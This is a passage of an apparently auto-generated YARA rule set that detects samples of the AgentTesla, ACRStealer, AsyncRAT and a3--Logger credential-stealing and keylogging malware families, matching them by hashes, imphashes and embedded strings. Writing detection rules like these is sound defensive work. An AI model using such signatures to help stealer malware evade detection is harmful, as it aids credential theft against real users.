      $s11 = "assertion failed: ctx->buf_off + i < (int)sizeof(ctx->buf)" fullword ascii /* score: '11.00'*/
      $s12 = "EVP_PKEY_public_check" fullword ascii /* score: '10.00'*/
      $s13 = "EVP_PKEY_new_raw_private_key" fullword ascii /* score: '10.00'*/
      $s14 = "assertion failed: ctx->tmp_len <= 3" fullword ascii /* score: '10.00'*/
      $s15 = "EVP_PKEY_new_raw_public_key" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4b50 ) and filesize < 28000KB and pe.imphash() == "297cfecdeec7600638a2d663ab104d8a" and ( 8 of them )
      ) or ( all of them )
}

rule _9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac_a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d_33 {
   meta:
      description = "_subset_batch - from files 9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac.elf, a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d0f9156adaabe65b_a42eece4.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce"
      hash2 = "a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d0f9156adaabe65b"
   strings:
      $s1 = "ntptr; runtime.fn func(); runtime.link *runtime._defer; runtime.head *internal/runtime/atomic.Pointer[runtime._defer] }]).Compar" ascii /* score: '19.00'*/
      $s2 = "internal/runtime/atomic.(*Pointer[go.shape.struct { runtime.heap bool; runtime.rangefunc bool; runtime.sp uintptr; runtime.pc ui" ascii /* score: '19.00'*/
      $s3 = "ABCDEFGHIJ" fullword wide /* reversed goodware string 'JIHGFEDCBA' */ /* score: '16.50'*/
      $s4 = "internal/runtime/atomic.(*Pointer[go.shape.a0c91c71fd368b5d30f8a04d1e4f14a4186fd3423a1957aa58b1e03c3b3735dd]).CompareAndSwapNoWB" ascii /* score: '16.00'*/
      $s5 = "runtime.traceLocker.GCSweepDone" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.traceLocker.GCSweepSpan" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.traceLocker.GCSweepStart" fullword ascii /* score: '15.00'*/
      $s8 = "internal/runtime/atomic.(*Pointer[go.shape.struct { runtime.r runtime.profAtomic; runtime.w runtime.profAtomic; runtime.overflow" ascii /* score: '14.00'*/
      $s9 = "internal/runtime/atomic.(*Uint64).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s10 = "internal/runtime/atomic.(*UnsafePointer).CompareAndSwapNoWB" fullword ascii /* score: '14.00'*/
      $s11 = "internal/runtime/atomic.(*Uint32).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s12 = "internal/runtime/atomic.(*Int64).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s13 = "internal/runtime/atomic.(*UnsafePointer).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s14 = "internal/runtime/atomic.(*Pointer[go.shape.struct { runtime.r runtime.profAtomic; runtime.w runtime.profAtomic; runtime.overflow" ascii /* score: '14.00'*/
      $s15 = "internal/runtime/atomic.(*Uintptr).CompareAndSwap" fullword ascii /* score: '14.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ACRStealer_signature__00efed44c47255dff78fbfc7f266ee4b_imphash__AgentTesla_signature__057cca90_AgentTesla_signature__bb4d11_34 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_00efed44c47255dff78fbfc7f266ee4b(imphash).exe, AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_bb4d11c9.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b40745b94aae3d819698c04d669b4680dc4c81392265ac49d37de4f113eabbbb"
      hash2 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash3 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
   strings:
      $x1 = "api-ms-win-downlevel-shell32-l1-1-0.dll" fullword wide /* reversed goodware string 'lld.0-1-1l-23llehs-levelnwod-niw-sm-ipa' */ /* score: '35.00'*/
      $s2 = "PERFETTO_CHECK(ptr <= chunk.end() - SharedMemoryABI::kPacketHeaderSize)" fullword ascii /* score: '23.00'*/
      $s3 = "mutex lock failed" fullword ascii /* score: '20.00'*/
      $s4 = "Logging-DUMP_WILL_BE_CHECK_MESSAGE" fullword ascii /* score: '19.00'*/
      $s5 = "v8.execute" fullword ascii /* score: '18.00'*/
      $s6 = "disabled-by-default-devtools.target-rundown" fullword ascii /* score: '17.00'*/
      $s7 = "GetThreadDescription" fullword ascii /* score: '15.00'*/
      $s8 = "login,screenlock_monitor" fullword ascii /* score: '15.00'*/
      $s9 = "DumpWithoutCrashing-line" fullword ascii /* score: '14.00'*/
      $s10 = "DumpWithoutCrashing-file" fullword ascii /* score: '14.00'*/
      $s11 = "length_error was thrown in -fno-exceptions mode with message \"%s\"" fullword ascii /* score: '14.00'*/
      $s12 = "DumpWithoutCrashing" fullword ascii /* score: '14.00'*/
      $s13 = "graphics.pipeline" fullword ascii /* score: '13.00'*/
      $s14 = "download_service" fullword ascii /* score: '13.00'*/
      $s15 = "money_get error" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x5550 or uint16(0) == 0x4f50 ) and filesize < 16000KB and pe.imphash() == "00efed44c47255dff78fbfc7f266ee4b" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signat_35 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash4 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash5 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash6 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "<System.Diagnostics.Process.dll&System.Formats.Asn1" fullword ascii /* score: '27.00'*/
      $s2 = "NSystem.Diagnostics.DiagnosticSource.dll4System.Diagnostics.Process" fullword ascii /* score: '27.00'*/
      $s3 = "BSystem.Collections.NonGeneric.dll@System.ComponentModel.Primitives" fullword ascii /* score: '25.00'*/
      $s4 = "System.Net.SocketsHttpHandler.PendingConnectionTimeoutOnRequestCompletio" fullword wide /* score: '22.00'*/
      $s5 = "X509_KEY_USAGE,X509_BASIC_CONSTRAINTS.X509_BASIC_CONSTRAINTS2.X509_ENHANCED_KEY_USAGE$X509_CERT_POLICIES.X509_UNICODE_ANY_STRING" ascii /* score: '21.00'*/
      $s6 = "get_KeyUsageOid:get_AuthorityKeyIdentifierOid6get_SubjectKeyIdentifierOid*get_SubjectAltNameOidBget_AuthorityInformationAccessOi" ascii /* score: '20.00'*/
      $s7 = "get_KeyUsageOid:get_AuthorityKeyIdentifierOid6get_SubjectKeyIdentifierOid*get_SubjectAltNameOidBget_AuthorityInformationAccessOi" ascii /* score: '20.00'*/
      $s8 = "System.Net.SocketsHttpHandler.MaxConnectionsPerServe" fullword wide /* score: '19.00'*/
      $s9 = "The encoded length exceeds the maximum supported by this library (Int32.MaxValue)" fullword wide /* score: '19.00'*/
      $s10 = "\"get_EccPublicBlob,get_EccFullPrivateBlob*get_EccFullPublicBlob.get_OpaqueTransportBlob@" fullword ascii /* score: '18.00'*/
      $s11 = "get_KeyUsages@" fullword ascii /* score: '17.00'*/
      $s12 = ".get_EnhancedKeyUsageOid" fullword ascii /* score: '17.00'*/
      $s13 = "$System.Console.dllFSystem.Diagnostics.DiagnosticSource" fullword ascii /* score: '16.00'*/
      $s14 = "A constructed tag used a definite length encoding, which is invalid for CER data. The input may be encoded with BER or DER" fullword wide /* score: '16.00'*/
      $s15 = "DOTNET_SYSTEM_NET_HTTP_SOCKETSHTTPHANDLER_PENDINGCONNECTIONTIMEOUTONREQUESTCOMPLETIO" fullword wide /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__636312a5ec1f8b9f790598a6e097c5a4_imphash__AgentTesla_signat_36 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash3 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash4 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash5 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash6 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash7 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "System.ComponentModel.Design.IDesignerHost.IsSupported" fullword ascii /* score: '25.00'*/
      $s2 = "Description: The process was terminated due to an internal error in the .NET Runtime" fullword wide /* score: '24.00'*/
      $s3 = "System.ComponentModel.TypeDescriptor.IsComObjectDescriptorSupported" fullword ascii /* score: '23.00'*/
      $s4 = "System.ComponentModel.DefaultValueAttribute.IsSupported" fullword ascii /* score: '20.00'*/
      $s5 = "Description: The process was terminated due to an unhandled exception" fullword wide /* score: '18.00'*/
      $s6 = "RtlGetReturnAddressHijackTarget" fullword ascii /* score: '17.00'*/
      $s7 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '17.00'*/
      $s8 = "System.GC.DTargetTCP" fullword ascii /* score: '17.00'*/
      $s9 = "Description: The application requested process termination through System.Environment.FailFast" fullword wide /* score: '17.00'*/
      $s10 = "peForTargetTypeNTryGetByRefTypeForTargetType_LookupOnly(GetCanonicalHashCode@" fullword ascii /* score: '16.00'*/
      $s11 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '16.00'*/
      $s12 = "DExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s13 = "Concurrent operations from multiple threads on this type are not supported" fullword wide /* score: '15.00'*/
      $s14 = "The collection's comparer does not support the requested operation" fullword wide /* score: '15.00'*/
      $s15 = "GCDTargetTCP" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__5ba0e07214b3423072c72a6e1cb6e11f_imphash__AgentTesla_signature__636312a5ec1f8b9f790598a6e097c5a4_imph_37 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash2 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash3 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash4 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash5 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
   strings:
      $s1 = "ize JSON text to objects, with UTF-8 support built-in. Also provides types to read and write JSON text encoded as UTF-8, and to " ascii /* score: '22.00'*/
      $s2 = "Provides high-performance and low-allocating types that serialize objects to JavaScript Object Notation (JSON) text and deserial" ascii /* score: '21.00'*/
      $s3 = "System.Collections.Generic.IEnumerator<System.Text.RegularExpressions.Symbolic.SymbolicRegexNode<TSet>>.get_Current" fullword ascii /* score: '15.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<System.Text.RegularExpressions.Symbolic.SymbolicRegexNode<TSet>>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s5 = "SetTarget@" fullword ascii /* score: '14.00'*/
      $s6 = " GetTargetCulture" fullword ascii /* score: '14.00'*/
      $s7 = " ComputeMinLength ComputeMaxLengthDTryGetOrdinalCaseInsensitiveString@" fullword ascii /* score: '10.00'*/
      $s8 = "IsIdeographicDescriptionCharacter" fullword wide /* score: '10.00'*/
      $s9 = "IsSuperscriptsandSubscript" fullword wide /* score: '10.00'*/
      $s10 = "RegexOptions.NonBacktracking is not supported in conjunction with expressions containing: '{0}'" fullword wide /* score: '10.00'*/
      $s11 = "GetMin@" fullword ascii /* score: '9.00'*/
      $s12 = "R<GetRegexBehavior>g__IsTurkishOrAzeri|8_0" fullword ascii /* score: '9.00'*/
      $s13 = "GetSetChars" fullword ascii /* score: '9.00'*/
      $s14 = "&get_BeginningAnchor" fullword ascii /* score: '9.00'*/
      $s15 = "GetFixedLength*AddFixedLengthMarkers@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__719bb222f4bbc8859273f71b5809958a_imphash__AgentTesla_signature__9e1c5e753d9730385056638ab1d72c60_imph_38 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash2 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash3 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash4 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "System.Collections.Generic.IEnumerator<System.Collections.Generic.KeyValuePair<System.String,System.Collections.Generic.IEnumera" ascii /* score: '18.00'*/
      $s2 = ":ContentDispositionHeaderValue.ContentRangeHeaderValue$CookieHeaderParser DateHeaderParser(EntityTagHeaderValue&GenericHeaderPar" ascii /* score: '17.00'*/
      $s3 = ":ContentDispositionHeaderValue.ContentRangeHeaderValue$CookieHeaderParser DateHeaderParser(EntityTagHeaderValue&GenericHeaderPar" ascii /* score: '17.00'*/
      $s4 = ".GetHashCodeOfStringCore\"IcuInitSortHandle2GetIsAsciiEqualityOrdinal IcuCompareString" fullword ascii /* score: '15.00'*/
      $s5 = "System.Collections.Generic.IEnumerator<Internal.TypeSystem.FieldDesc>.get_Current@" fullword ascii /* score: '15.00'*/
      $s6 = " HeaderDescriptor" fullword ascii /* score: '15.00'*/
      $s7 = "CheckValidToken\"CheckValidComment@GetNextNonEmptyOrWhitespaceIndex" fullword ascii /* score: '15.00'*/
      $s8 = "TransformBlock may only process bytes in block sized increments" fullword wide /* score: '15.00'*/
      $s9 = "GetHostLength&GetQuotedPairLength" fullword ascii /* score: '14.00'*/
      $s10 = "*GetContentRangeLength$TryGetLengthLength\"TryGetRangeLength" fullword ascii /* score: '14.00'*/
      $s11 = "System.Collections.Generic.IEnumerator<System.Collections.Generic.KeyValuePair<System.String,System.Collections.Generic.IEnumera" ascii /* score: '13.00'*/
      $s12 = "ble<System.String>>>.get_Current@" fullword ascii /* score: '12.00'*/
      $s13 = "GetSharedHandle" fullword ascii /* score: '12.00'*/
      $s14 = "4OnExecutionContextCallbackLCreateAppropriateCancellationException" fullword ascii /* score: '12.00'*/
      $s15 = "HttpHeaders+" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ACRStealer_signature__317c7693acb4dc9fe940d7130473eec7_imphash__ACRStealer_signature__736de9fcca98a022aab3c05fec7c560a_imph_39 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_317c7693acb4dc9fe940d7130473eec7(imphash).dll, ACRStealer(signature)_736de9fcca98a022aab3c05fec7c560a(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "604605343e727a909af085e669534d34ba825cee023706e1f03dc35549fb999a"
      hash2 = "014e65cc2e8bc22befa55e494fa20bde0534ed0289d6733e943d786db9648369"
   strings:
      $s1 = "Failed reading the chunked-encoded stream" fullword ascii /* score: '22.00'*/
      $s2 = "Authorization: %s4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s" fullword ascii /* score: '17.50'*/
      $s3 = "Excess found in a read: excess = %zu, size = %I64d, maxdownload = %I64d, bytecount = %I64d" fullword ascii /* score: '16.00'*/
      $s4 = "Content-Type: %s%s%s" fullword ascii /* score: '16.00'*/
      $s5 = "Content-Disposition: %s%s%s%s%s%s%s" fullword ascii /* score: '16.00'*/
      $s6 = "SOCKS4%s: connecting to HTTP proxy %s port %d" fullword ascii /* score: '15.50'*/
      $s7 = "No valid port number in connect to host string (%s)" fullword ascii /* score: '15.00'*/
      $s8 = "getaddrinfo() thread failed to start" fullword ascii /* score: '15.00'*/
      $s9 = "Excessive password length for proxy auth" fullword ascii /* score: '15.00'*/
      $s10 = "%s.%s.tmp" fullword ascii /* score: '14.00'*/
      $s11 = "# https://curl.se/docs/http-cookies.html" fullword ascii /* score: '14.00'*/
      $s12 = "Unsupported proxy '%s', libcurl is built without the HTTPS-proxy support." fullword ascii /* score: '13.00'*/
      $s13 = " public key hash: sha256//%s" fullword ascii /* score: '13.00'*/
      $s14 = "SOCKS5: connecting to HTTP proxy %s port %d" fullword ascii /* score: '13.00'*/
      $s15 = "Unsupported HTTP version (%u.%d) in response" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__52b56ee2_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_40 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_52b56ee2.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d9c88dd0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "52b56ee281862172cf1bae61e1d75f0f3b15635f3e9d2f426d298cd21eef35da"
      hash2 = "d9c88dd020a9d2e651ea26fa41d9390cbd175d16ba9c8b3c5037dbc1c21e2886"
   strings:
      $s1 = "msedge.exe" fullword ascii /* score: '22.00'*/
      $s2 = "OfflineKeylogger Not Enabled" fullword wide /* score: '17.00'*/
      $s3 = "UP9PLdVZI7ojd30oATYQi9KUIm8ub8SkkRRZ0S01nvzS5dY2KN9yomFtppLwsmX6g" fullword ascii /* score: '9.00'*/
      $s4 = "o6tbTiaAQay6sI02BBF9PD9zQ18SZuWSdlL0gf4QmwLx4ES3yJo" fullword ascii /* score: '9.00'*/
      $s5 = "EYs6M5ZdzvlpqMIRRS77iK8UEglfVEYet" fullword ascii /* score: '9.00'*/
      $s6 = "i5Mub4v8d2NqQanTddX6NDqsFfTp462oX" fullword ascii /* score: '9.00'*/
      $s7 = "0zJ8USZfWsGAZvC8luK3rIF7DllFM6MsM" fullword ascii /* score: '9.00'*/
      $s8 = "L7lB0wipClOgaL2PuaVqMS0CpeZwtcI20" fullword ascii /* score: '9.00'*/
      $s9 = "zKl1kmdWepECbqC8eZKJyzDa7hw1HIZSR3LErjFkPcPdx2aGYVfTp4qhgYbEkm8pYCy4FQklI8CjWkAqSzCQOn8gMo8" fullword ascii /* score: '9.00'*/
      $s10 = "1r7h0lynadG49d7oix9Xdvk0Lhf7f5uKHjyEcXhoms53SwDBNqyu0CKschzEQFp947cOcEEsNILRKqPDeZd" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac_9cbefe68f395e67356e2a5d8d1b285c0_imphash__a42eece_41 {
   meta:
      description = "_subset_batch - from files 9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d0f9156adaabe65b_a42eece4.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce"
      hash2 = "aa02002f4cdb80fe881ccaad7626f3161e83490b276659ab01879e736f44540f"
      hash3 = "a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d0f9156adaabe65b"
   strings:
      $s1 = "runtime.errorAddressString.Error" fullword ascii /* score: '16.00'*/
      $s2 = "runtime.boundsError.Error" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.(*errorAddressString).Error" fullword ascii /* score: '13.00'*/
      $s4 = "ForgetUnshared" fullword ascii /* score: '12.00'*/
      $s5 = "internal/abi.(*IntArgRegBitmap).Get" fullword ascii /* score: '12.00'*/
      $s6 = "LookupHost" fullword ascii /* score: '12.00'*/
      $s7 = "DecodedLen" fullword ascii /* score: '11.00'*/
      $s8 = "internal/bytealg.Compare" fullword ascii /* score: '11.00'*/
      $s9 = "*chan<- error" fullword ascii /* score: '11.00'*/
      $s10 = "sync/atomic.CompareAndSwapUintptr" fullword ascii /* score: '11.00'*/
      $s11 = "@@@@@@@@@@@@@@@" fullword wide /* reversed goodware string '@@@@@@@@@@@@@@@' */ /* score: '11.00'*/
      $s12 = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@" fullword wide /* reversed goodware string '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' */ /* score: '11.00'*/
      $s13 = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@" fullword wide /* reversed goodware string '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' */ /* score: '11.00'*/
      $s14 = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@" fullword wide /* reversed goodware string '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' */ /* score: '11.00'*/
      $s15 = "runtime.GOMAXPROCS" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d or uint16(0) == 0xfacf ) and filesize < 24000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 8 of them )
      ) or ( all of them )
}

rule _97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0_97b2588f_9bc109acfded2eaae2348204bcab5c1c58a91310539433649_42 {
   meta:
      description = "_subset_batch - from files 97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0_97b2588f.exe, 9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac.elf, a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d0f9156adaabe65b_a42eece4.macho, a9c831511812a6bb688006ddf3498e1bffc6b4ffeeb4b5cccef2bc4e898c0594_a9c83151.exe, b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb00b3b476f0cfdaa_b053ca27.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0"
      hash2 = "9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce"
      hash3 = "a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d0f9156adaabe65b"
      hash4 = "a9c831511812a6bb688006ddf3498e1bffc6b4ffeeb4b5cccef2bc4e898c0594"
      hash5 = "b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb00b3b476f0cfdaa"
   strings:
      $s1 = "isMutexWait" fullword ascii /* score: '15.00'*/
      $s2 = "targetCPUFraction" fullword ascii /* score: '14.00'*/
      $s3 = "getWithKey" fullword ascii /* score: '12.00'*/
      $s4 = "getWithoutKeySmallFastStr" fullword ascii /* score: '12.00'*/
      $s5 = "getWithoutKey" fullword ascii /* score: '12.00'*/
      $s6 = "getWithKeySmall" fullword ascii /* score: '12.00'*/
      $s7 = "*runtime.sysStatsAggregate" fullword ascii /* score: '11.00'*/
      $s8 = "4*[8]struct { key runtime._typePair; elem struct {} }" fullword ascii /* score: '10.00'*/
      $s9 = "3*[]struct { key runtime._typePair; elem struct {} }" fullword ascii /* score: '10.00'*/
      $s10 = "*runtime.traceFrame" fullword ascii /* score: '10.00'*/
      $s11 = "1*struct { key runtime._typePair; elem struct {} }" fullword ascii /* score: '10.00'*/
      $s12 = "/*struct { key string; elem runtime.metricData }" fullword ascii /* score: '10.00'*/
      $s13 = "1*[]struct { key string; elem runtime.metricData }" fullword ascii /* score: '10.00'*/
      $s14 = "*[0]*runtime.PanicNilError" fullword ascii /* score: '10.00'*/
      $s15 = "*runtime.PanicNilError" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f or uint16(0) == 0xfacf ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0cb006d7_a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5_43 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0cb006d7.exe, a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_93bba362.exe, a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d2769c44.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_881aac6c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0cb006d7434c2ffa1b04e4f20a90688e8eb36e82cea2db1641744e235995439b"
      hash2 = "93bba3622d1594eb97ea253dbee9a1d5c495871b73410bccd6c41d7969d3b8a2"
      hash3 = "d2769c44ac1fc171c71e75f8cdb446a0615f0a151a49dff4720ad64c7d809ee4"
      hash4 = "881aac6c0395e173fe15acd1baf9caf443e73e166176b5040ccdb7e34750ed58"
   strings:
      $s1 = "System.Windows.Forms.LeftRightAlignment, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" ascii /* score: '27.00'*/
      $s2 = "Vip.CustomForm.Images.SystemButtons.bmp" fullword wide /* score: '17.00'*/
      $s3 = "m_systemCommands" fullword ascii /* score: '15.00'*/
      $s4 = "GetButtonCommand" fullword ascii /* score: '12.00'*/
      $s5 = "OnWmSysCommand" fullword ascii /* score: '12.00'*/
      $s6 = "get_FrameLayout" fullword ascii /* score: '12.00'*/
      $s7 = "-Gets or Set Value to Drop Shadow to the form." fullword ascii /* score: '11.00'*/
      $s8 = "get_IsSizeable" fullword ascii /* score: '9.00'*/
      $s9 = "get_IsWindows7" fullword ascii /* score: '9.00'*/
      $s10 = "get_MdiHelpButton" fullword ascii /* score: '9.00'*/
      $s11 = "GetButtonImage" fullword ascii /* score: '9.00'*/
